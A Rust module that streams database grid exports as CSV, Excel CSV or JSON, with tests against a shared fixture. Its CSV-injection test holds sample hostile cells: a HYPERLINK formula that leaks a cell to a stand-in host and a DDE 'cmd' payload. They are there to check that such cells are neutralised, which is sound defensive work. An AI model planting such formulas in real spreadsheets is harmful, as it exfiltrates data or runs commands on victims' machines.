//! Streaming exports of every row matching a grid's filter: pages are read through the gateway (by keyset where the
//! engine hands one out, so a large export stays linear) and written as they arrive, so memory stays at one page. The
//! desktop app writes into Downloads; the web edition streams the file as the download's response body.
//!
//! The text is byte for byte what the grid's in-page exporters write (`src/features/importExport/exporters.ts`): CSV and
//! the Excel flavour from `displayValue`, JSON from `valueToJson` through `JSON.stringify(rows, null, 2)`, with JavaScript's
//! number text and key order. One difference: integers beyond 2^53 are written exactly (the page rounded them).
//! A shared fixture (`src/core/__fixtures__/export/rows.json`) holds the expected text for both sides.

use std::borrow::Cow;

use async_trait::async_trait;
use serde::{Deserialize, Serialize};

use crate::{
    contract::{value::format_float, BrowseRequest, CancellationToken, ColumnInfo, Value},
    error::{AppError, AppResult},
    gateway::{self, Context},
    runtime::ConnectionManager,
};

/// Rows per page while exporting (engines cap it lower where they must).
const EXPORT_PAGE: u64 = 5000;
/// Byte order mark: Excel needs it to read UTF-8.
const BOM: &str = "\u{feff}";

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub enum ExportFormat {
    Csv,
    /// CSV with a byte order mark and the locale's list separator.
    Excel,
    Json,
}

impl ExportFormat {
    pub fn content_type(self) -> &'static str {
        match self {
            ExportFormat::Csv | ExportFormat::Excel => "text/csv; charset=utf-8",
            ExportFormat::Json => "application/json; charset=utf-8",
        }
    }
}

/// What to export: the grid's object, filter, sort and columns (paging fields are ignored), the format and file name.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ExportRequest {
    pub browse: BrowseRequest,
    pub format: ExportFormat,
    /// The Excel flavour's separator (the frontend knows the locale); `,` otherwise.
    #[serde(default)]
    pub separator: Option<String>,
    pub file_name: String,
    /// `cancel_request(request_id)` stops the export.
    #[serde(default)]
    pub request_id: Option<String>,
}

/// Progress of a running export.
#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ExportProgress {
    pub rows: u64,
}

/// Where the text goes, chunk by chunk.
#[async_trait]
pub trait ChunkSink: Send {
    async fn write(&mut self, chunk: Vec<u8>) -> AppResult<()>;
}

/// Reads every page and writes it; returns the number of rows. Stops with `CANCELLED` once `cancel` is set.
pub async fn export(
    mgr: &ConnectionManager,
    context: &Context,
    connection_id: &str,
    request: &ExportRequest,
    cancel: &CancellationToken,
    sink: &mut dyn ChunkSink,
    progress: &mut (dyn FnMut(u64) + Send),
) -> AppResult<u64> {
    let mut writer = Writer::new(request.format, request.separator.as_deref());
    let mut page_request = BrowseRequest {
        offset: 0,
        after: None,
        limit: EXPORT_PAGE,
        estimate_total: false,
        exact_total: false,
        reverse: false,
        ..request.browse.clone()
    };
    let mut rows = 0u64;
    loop {
        if cancel.is_cancelled() {
            return Err(crate::contract::cancelled());
        }
        let page = gateway::browse_until(mgr, context, connection_id, &page_request, cancel).await?;
        let text = writer.page(&page.columns, &page.rows);
        sink.write(text.into_bytes()).await?;
        rows += page.rows.len() as u64;
        progress(rows);
        if !page.has_more || page.rows.is_empty() {
            break;
        }
        page_request.offset = rows;
        page_request.after = page.next_keyset;
    }
    sink.write(writer.finish().into_bytes()).await?;
    Ok(rows)
}

/// Turns pages into the file's text; the pieces joined are the whole file.
pub struct Writer {
    format: ExportFormat,
    separator: String,
    /// Exportable column indexes and names, from the first page.
    columns: Option<Vec<(usize, String)>>,
    rows: u64,
}

impl Writer {
    pub fn new(format: ExportFormat, separator: Option<&str>) -> Self {
        let separator = match format {
            ExportFormat::Excel => separator.filter(|text| !text.is_empty()).unwrap_or(",").to_owned(),
            _ => ",".to_owned(),
        };
        Self {
            format,
            separator,
            columns: None,
            rows: 0,
        }
    }

    /// The text of one page (the header too, on the first).
    pub fn page(&mut self, columns: &[ColumnInfo], rows: &[Vec<Value>]) -> String {
        let mut out = String::new();
        if self.columns.is_none() {
            // Vector columns are left out (the grid holds only a summary of them).
            let exportable: Vec<(usize, String)> = columns
                .iter()
                .enumerate()
                .filter(|(_, column)| column.hints.vector_dims.is_none())
                .map(|(index, column)| (index, column.name.clone()))
                .collect();
            if self.format != ExportFormat::Json {
                if self.format == ExportFormat::Excel {
                    out.push_str(BOM);
                }
                let names: Vec<String> = exportable.iter().map(|(_, name)| self.field(Some(name))).collect();
                out.push_str(&names.join(&self.separator));
            }
            self.columns = Some(exportable);
        }
        let columns = self.columns.as_deref().unwrap_or_default();
        for row in rows {
            let cell = |index: usize| row.get(index).unwrap_or(&Value::Null);
            match self.format {
                ExportFormat::Json => {
                    out.push_str(if self.rows == 0 { "[\n  " } else { ",\n  " });
                    let object = Js::Obj(columns.iter().map(|(index, name)| (name.clone(), to_js(cell(*index)))).collect());
                    object.write(&mut out, Some(1));
                }
                _ => {
                    let fields: Vec<String> = columns
                        .iter()
                        .map(|(index, _)| self.field(display(cell(*index)).as_deref()))
                        .collect();
                    out.push_str("\r\n");
                    out.push_str(&fields.join(&self.separator));
                }
            }
            self.rows += 1;
        }
        out
    }

    /// What closes the file.
    pub fn finish(&mut self) -> String {
        match self.format {
            ExportFormat::Json if self.rows == 0 => "[]".to_owned(),
            ExportFormat::Json => "\n]".to_owned(),
            // A table without a first page still gets its (empty) header.
            _ if self.columns.is_none() => String::from(if self.format == ExportFormat::Excel { BOM } else { "" }),
            _ => String::new(),
        }
    }

    /// RFC 4180 field: quoted when it holds the separator, a quote or a line break, or was neutralised; NULL is empty.
    fn field(&self, text: Option<&str>) -> String {
        let Some(text) = text else { return String::new() };
        let safe = neutralise_formula(text);
        if matches!(safe, Cow::Owned(_)) || safe.contains(self.separator.as_str()) || safe.contains(['"', '\r', '\n']) {
            format!("\"{}\"", safe.replace('"', "\"\""))
        } else {
            safe.into_owned()
        }
    }
}

/// Spreadsheets (Excel, LibreOffice, Numbers) run a cell that starts with one of these as a formula: OWASP "CSV injection".
const FORMULA_START: [char; 6] = ['=', '+', '-', '@', '\t', '\r'];

/// `neutraliseFormula`: a cell that a spreadsheet would evaluate gets a leading single quote, which spreadsheets take
/// as "text follows"; a plain number such as `-5` is kept as it is so the sheet still reads a number.
fn neutralise_formula(text: &str) -> Cow<'_, str> {
    if text.starts_with(FORMULA_START) && !is_plain_number(text) {
        Cow::Owned(format!("'{text}"))
    } else {
        Cow::Borrowed(text)
    }
}

/// `-?[0-9]+(\.[0-9]+)?([eE][+-]?[0-9]+)?`, as the page's `PLAIN_NUMBER` matches.
fn is_plain_number(text: &str) -> bool {
    fn digits(text: &str) -> Option<&str> {
        let end = text.find(|c: char| !c.is_ascii_digit()).unwrap_or(text.len());
        (end > 0).then(|| &text[end..])
    }
    let Some(mut rest) = digits(text.strip_prefix('-').unwrap_or(text)) else {
        return false;
    };
    if let Some(after) = rest.strip_prefix('.') {
        let Some(after) = digits(after) else { return false };
        rest = after;
    }
    if let Some(after) = rest.strip_prefix(['e', 'E']) {
        let Some(after) = digits(after.strip_prefix(['+', '-']).unwrap_or(after)) else {
            return false;
        };
        rest = after;
    }
    rest.is_empty()
}

/// `displayValue`: the text of a grid cell; `None` for NULL.
pub fn display(value: &Value) -> Option<String> {
    Some(match value {
        Value::Null => return None,
        Value::Document(_) => {
            let mut out = String::new();
            to_js(value).write(&mut out, None);
            out
        }
        Value::Array(items) => {
            let items: Vec<String> = items
                .iter()
                .map(|item| match item {
                    Value::Null => "null".to_owned(),
                    Value::Text(_)
                    | Value::Uuid(_)
                    | Value::Interval(_)
                    | Value::Date(_)
                    | Value::Time(_)
                    | Value::Timestamp(_)
                    | Value::TimestampTz(_)
                    | Value::ObjectId(_)
                    | Value::Other { .. } => json_string(&display(item).unwrap_or_default()),
                    other => display(other).unwrap_or_default(),
                })
                .collect();
            format!("[{}]", items.join(", "))
        }
        other => other.display().unwrap_or_default(),
    })
}

/// A JSON value as JavaScript holds it: numbers are doubles (integers of a cell stay exact), objects keep JavaScript's
/// key order.
#[derive(Debug, Clone, PartialEq)]
enum Js {
    Null,
    Bool(bool),
    Int(i64),
    Num(f64),
    Str(String),
    Arr(Vec<Js>),
    Obj(Vec<(String, Js)>),
}

/// `valueToJson`.
fn to_js(value: &Value) -> Js {
    match value {
        Value::Null => Js::Null,
        Value::Bool(b) => Js::Bool(*b),
        Value::Int(i) => Js::Int(*i),
        Value::Float(f) if f.is_finite() => Js::Num(*f),
        Value::Float(f) => Js::Str(format_float(*f)),
        Value::Json(text) => parse_json(text).unwrap_or_else(|| Js::Str(text.clone())),
        Value::Array(items) => Js::Arr(items.iter().map(to_js).collect()),
        Value::ObjectId(hex) => Js::Obj(vec![("$oid".to_owned(), Js::Str(hex.clone()))]),
        Value::Document(fields) => Js::Obj(fields.iter().map(|(key, item)| (key.clone(), to_js(item))).collect()),
        other => Js::Str(display(other).unwrap_or_default()),
    }
}

impl Js {
    /// `JSON.stringify`: compact without `indent`, else with two spaces per level, starting at `level`.
    fn write(&self, out: &mut String, level: Option<usize>) {
        match self {
            Js::Null => out.push_str("null"),
            Js::Bool(b) => out.push_str(if *b { "true" } else { "false" }),
            Js::Int(i) => out.push_str(&i.to_string()),
            Js::Num(f) => out.push_str(&js_number(*f)),
            Js::Str(s) => out.push_str(&json_string(s)),
            Js::Arr(items) => write_list(out, level, '[', ']', items.iter().map(|item| (None, item))),
            Js::Obj(fields) => {
                let ordered = js_key_order(fields);
                write_list(out, level, '{', '}', ordered.into_iter().map(|(key, item)| (Some(key), item)));
            }
        }
    }
}

fn write_list<'a>(
    out: &mut String,
    level: Option<usize>,
    open: char,
    close: char,
    items: impl ExactSizeIterator<Item = (Option<&'a str>, &'a Js)>,
) {
    if items.len() == 0 {
        out.push(open);
        out.push(close);
        return;
    }
    out.push(open);
    let inner = level.map(|level| level + 1);
    for (i, (key, item)) in items.enumerate() {
        if i > 0 {
            out.push(',');
        }
        if let Some(inner) = inner {
            out.push('\n');
            out.push_str(&"  ".repeat(inner));
        }
        if let Some(key) = key {
            out.push_str(&json_string(key));
            out.push_str(if inner.is_some() { ": " } else { ":" });
        }
        item.write(out, inner);
    }
    if let Some(level) = level {
        out.push('\n');
        out.push_str(&"  ".repeat(level));
    }
    out.push(close);
}

/// The keys of a JavaScript object built from these entries: a repeated key keeps its first place and its last value,
/// and array-index keys ("0", "17") come first in ascending order.
fn js_key_order(fields: &[(String, Js)]) -> Vec<(&str, &Js)> {
    let mut unique: Vec<(&str, &Js)> = Vec::with_capacity(fields.len());
    for (key, value) in fields {
        match unique.iter_mut().find(|(known, _)| *known == key.as_str()) {
            Some(entry) => entry.1 = value,
            None => unique.push((key, value)),
        }
    }
    let index = |key: &str| -> Option<u32> {
        let canonical = key == "0" || (!key.starts_with('0') && !key.is_empty() && key.bytes().all(|b| b.is_ascii_digit()));
        canonical.then(|| key.parse::<u32>().ok()).flatten().filter(|n| *n < u32::MAX)
    };
    let mut indexed: Vec<(u32, (&str, &Js))> = unique.iter().filter_map(|entry| index(entry.0).map(|n| (n, *entry))).collect();
    indexed.sort_by_key(|(n, _)| *n);
    indexed
        .into_iter()
        .map(|(_, entry)| entry)
        .chain(unique.into_iter().filter(|(key, _)| index(key).is_none()))
        .collect()
}

/// JavaScript's `String(number)` (as `JSON.stringify` writes it): shortest round-trip digits, exponent form below
/// 1e-6 and from 1e21, `-0` as `0`.
pub fn js_number(f: f64) -> String {
    if !f.is_finite() {
        return "null".to_owned();
    }
    if f == 0.0 {
        return "0".to_owned();
    }
    let magnitude = f.abs();
    if (1e-6..1e21).contains(&magnitude) {
        return f.to_string();
    }
    let text = format!("{f:e}");
    match text.split_once('e') {
        Some((mantissa, exponent)) if !exponent.starts_with('-') => format!("{mantissa}e+{exponent}"),
        _ => text,
    }
}

fn json_string(text: &str) -> String {
    serde_json::to_string(text).unwrap_or_default()
}

/// `JSON.parse` keeping the key order and duplicates (JavaScript's rules apply when writing); numbers become doubles.
fn parse_json(text: &str) -> Option<Js> {
    let mut parser = Parser {
        bytes: text.as_bytes(),
        at: 0,
    };
    let value = parser.value()?;
    parser.space();
    (parser.at == parser.bytes.len()).then_some(value)
}

struct Parser<'a> {
    bytes: &'a [u8],
    at: usize,
}

impl Parser<'_> {
    fn space(&mut self) {
        while matches!(self.bytes.get(self.at), Some(b' ' | b'\t' | b'\n' | b'\r')) {
            self.at += 1;
        }
    }

    fn eat(&mut self, word: &str) -> bool {
        if self.bytes[self.at..].starts_with(word.as_bytes()) {
            self.at += word.len();
            true
        } else {
            false
        }
    }

    fn value(&mut self) -> Option<Js> {
        self.space();
        match *self.bytes.get(self.at)? {
            b'n' => self.eat("null").then_some(Js::Null),
            b't' => self.eat("true").then_some(Js::Bool(true)),
            b'f' => self.eat("false").then_some(Js::Bool(false)),
            b'"' => self.string().map(Js::Str),
            b'[' => {
                self.at += 1;
                let mut items = Vec::new();
                self.space();
                if self.eat("]") {
                    return Some(Js::Arr(items));
                }
                loop {
                    items.push(self.value()?);
                    self.space();
                    if self.eat("]") {
                        return Some(Js::Arr(items));
                    }
                    if !self.eat(",") {
                        return None;
                    }
                }
            }
            b'{' => {
                self.at += 1;
                let mut fields = Vec::new();
                self.space();
                if self.eat("}") {
                    return Some(Js::Obj(fields));
                }
                loop {
                    self.space();
                    if self.bytes.get(self.at) != Some(&b'"') {
                        return None;
                    }
                    let key = self.string()?;
                    self.space();
                    if !self.eat(":") {
                        return None;
                    }
                    fields.push((key, self.value()?));
                    self.space();
                    if self.eat("}") {
                        return Some(Js::Obj(fields));
                    }
                    if !self.eat(",") {
                        return None;
                    }
                }
            }
            _ => self.number(),
        }
    }

    fn number(&mut self) -> Option<Js> {
        let start = self.at;
        while matches!(self.bytes.get(self.at), Some(b'-' | b'+' | b'.' | b'e' | b'E' | b'0'..=b'9')) {
            self.at += 1;
        }
        let text = std::str::from_utf8(&self.bytes[start..self.at]).ok()?;
        // JSON's grammar, which is stricter than Rust's float parser.
        let digits = text.strip_prefix('-').unwrap_or(text);
        let leading_zero = digits.len() > 1 && digits.starts_with('0') && digits.as_bytes()[1].is_ascii_digit();
        if digits.is_empty() || !digits.as_bytes()[0].is_ascii_digit() || leading_zero || text.ends_with('.') || text.contains(".e") {
            return None;
        }
        text.parse::<f64>().ok().map(Js::Num)
    }

    fn string(&mut self) -> Option<String> {
        let start = self.at;
        self.at += 1;
        loop {
            match *self.bytes.get(self.at)? {
                b'"' => break,
                b'\\' => self.at += 2,
                byte if byte < 0x20 => return None,
                _ => self.at += 1,
            }
        }
        self.at += 1;
        serde_json::from_slice::<String>(&self.bytes[start..self.at]).ok()
    }
}

/// Errors of a web export ticket.
pub fn unknown_ticket() -> AppError {
    AppError::new("This download has expired or was already used. Start the export again.")
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::contract::ColumnInfo;

    /// The shared fixture: columns, rows on the wire, and the exporters' text for each format.
    #[derive(Deserialize)]
    struct Fixture {
        columns: Vec<ColumnInfo>,
        rows: Vec<Vec<Value>>,
        csv: String,
        excel: String,
        json: String,
        #[serde(rename = "jsonEmpty")]
        json_empty: String,
    }

    fn fixture() -> Fixture {
        serde_json::from_str(include_str!("../../src/core/__fixtures__/export/rows.json")).unwrap()
    }

    /// Writes the rows in pages of `size`, as an export reads them.
    fn written(format: ExportFormat, separator: Option<&str>, columns: &[ColumnInfo], rows: &[Vec<Value>], size: usize) -> String {
        let mut writer = Writer::new(format, separator);
        let mut out = String::new();
        if rows.is_empty() {
            out.push_str(&writer.page(columns, &[]));
        }
        for chunk in rows.chunks(size.max(1)) {
            out.push_str(&writer.page(columns, chunk));
        }
        out.push_str(&writer.finish());
        out
    }

    #[test]
    fn streamed_text_matches_the_page_exporters() {
        let f = fixture();
        for size in [1, 2, 100] {
            assert_eq!(
                written(ExportFormat::Csv, None, &f.columns, &f.rows, size),
                f.csv,
                "csv, pages of {size}"
            );
            assert_eq!(
                written(ExportFormat::Excel, Some(";"), &f.columns, &f.rows, size),
                f.excel,
                "excel, pages of {size}"
            );
            assert_eq!(
                written(ExportFormat::Json, None, &f.columns, &f.rows, size),
                f.json,
                "json, pages of {size}"
            );
        }
        assert_eq!(written(ExportFormat::Json, None, &f.columns, &[], 1), f.json_empty);
    }

    #[test]
    fn numbers_and_keys_follow_javascript() {
        assert_eq!(js_number(1.0), "1");
        assert_eq!(js_number(-0.0), "0");
        assert_eq!(js_number(1e21), "1e+21");
        assert_eq!(js_number(1.5e-7), "1.5e-7");
        assert_eq!(js_number(123456789012345680000.0), "123456789012345680000");
        assert_eq!(js_number(0.000001), "0.000001");
        let mut out = String::new();
        parse_json(r#"{"b":1,"2":2,"a":[1.0,{}],"1":3,"b":4}"#)
            .unwrap()
            .write(&mut out, None);
        assert_eq!(out, r#"{"1":3,"2":2,"b":4,"a":[1,{}]}"#);
        assert!(parse_json("01").is_none() && parse_json("{\"a\":}").is_none() && parse_json("[1,]").is_none());
    }

    #[test]
    fn cells_a_spreadsheet_would_evaluate_are_neutralised() {
        let writer = Writer::new(ExportFormat::Csv, None);
        let field = |text: &str| writer.field(Some(text));
        assert_eq!(
            field(r#"=HYPERLINK("http://evil.example/?"&A1,"x")"#),
            r#""'=HYPERLINK(""http://evil.example/?""&A1,""x"")""#
        );
        assert_eq!(field("-2+3+cmd|' /C calc'!A0"), "\"'-2+3+cmd|' /C calc'!A0\"");
        assert_eq!(field("+1"), "\"'+1\"");
        assert_eq!(field("@SUM(A1)"), "\"'@SUM(A1)\"");
        assert_eq!(field("\tx"), "\"'\tx\"");
        assert_eq!(field("\rx"), "\"'\rx\"");
        assert_eq!(field("-Infinity"), "\"'-Infinity\"");
        // Plain numbers, negative ones too, are left alone so the sheet still reads a number.
        for number in ["-5", "-1.5e-7", "-0.000100", "-1E+3", "-1e5", "0", "12.50"] {
            assert_eq!(field(number), number);
        }
        for not_number in ["-", "-.5", "-5.", "-1e", "-1e+", "-5 ", "- 5", "--5", "-5-"] {
            assert!(!is_plain_number(not_number), "{not_number:?}");
        }
        let excel = Writer::new(ExportFormat::Excel, Some(";"));
        assert_eq!(excel.field(Some("=1;2")), "\"'=1;2\"");
    }
}
